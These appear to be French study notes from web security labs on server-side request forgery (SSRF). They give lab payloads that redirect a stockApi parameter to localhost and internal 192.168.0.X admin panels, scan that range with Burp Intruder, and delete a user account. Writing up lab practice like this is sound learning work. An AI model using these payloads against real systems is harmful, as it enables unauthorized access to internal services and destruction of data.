## Description
Le Server-Side Request forgery est une vulnérabilité de sécurité web qui permet à un attaquant d'amener l'application côté serveur à envoyer des requêtes à un endroit non désiré.

### Impact
Une attaque SSRF réussie peut souvent entraîner des actions non autorisées ou l'accès à des données au sein de l'organisation. Cela peut se produire dans l'application vulnérable ou dans d'autres systèmes de base avec lesquels l'application peut communiquer. Dans certaines situations, la vulnérabilité SSRF peut permettre à un attaquant d'exécuter des commandes arbitraires.

- **Exemple 1**
```
stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=2&storeId=1

```
Ici la fonctionalite de `stockApi` contient une vulnerabilte de `SSRF`, qui recupere les donnes dans un systems internes.
Si alors je le change en `http://localhost/admin` j'accede a la panel admin interne en local
```html
                       <h1>Users</h1>
                        <div>
                            <span>wiener - </span>
                            <a href="/admin/delete?username=wiener">Delete</a>
                        </div>
                        <div>
                            <span>carlos - </span>
                            <a href="/admin/delete?username=carlos">Delete</a>
                        </div>

```
et a partir d'ici si je veux supprimer un utilisateur je vais juste copier cet url qui me renvoi a son profil

```
stockApi=http://localhost/admin/delete?username=carlos&sto
```


- **Exemple 2: SSRF par rapport a un system backend**

Ce laboratoire dispose d'une fonction de contrôle des stocks qui récupère les données d'un système interne.
```
stockApi=http://192.168.0.1:8080/product/stock/check?productId=2&storeId=1
```
- pour resoudre ce lab, on doit utiliser la fonctionnalité de contrôle des stocks pour rechercher dans la plage interne `192.168.0.X` une interface d'administration sur le port 8080, puis l'utiliser pour supprimer l'utilisateur `Carlos`.

Avec Burp Intruder je trouve que le lenght de `173` est trop moins que les autres aussi avec un not found

```html
stockApi=http://192.168.0.173:8080/admin&storeId=1


                        <h1>Users</h1>
                        <div>
                            <span>wiener - </span>
                            <a href="/http://192.168.0.173:8080/admin/delete?username=wiener">Delete</a>
                        </div>
                        <div>
                            <span>carlos - </span>
                            <a href="/http://192.168.0.173:8080/admin/delete?username=carlos">Delete</a>
                        </div>
```

- **Exemple 3: SSRF aveugle avec détection hors bande**
Ce site utilise un logiciel d'analyse qui récupère l'URL spécifiée dans l'en-tête Referer lorsqu'une page de produit est chargée.
SSRF est une vulnérabilité de sécurité des applications web qui permet à l'attaquant de forcer le serveur à faire des requêtes non autorisées à n'importe quelle source locale ou externe au nom du serveur web. La SSRF permet à un pirate d'interagir avec des systèmes internes, ce qui peut entraîner des fuites de données, des interruptions de service, voire l'exécution de codes à distance.

## Basic SSRF
Le SSRF de base est une technique d'attaque sur le web par laquelle un pirate incite un serveur à effectuer des requêtes en son nom, souvent en ciblant des systèmes internes ou des services tiers. En exploitant les vulnérabilités de la validation des entrées, l'attaquant peut obtenir un accès non autorisé à des informations sensibles ou contrôler des ressources distantes, ce qui représente un risque de sécurité important pour l'application ciblée et son infrastructure sous-jacente.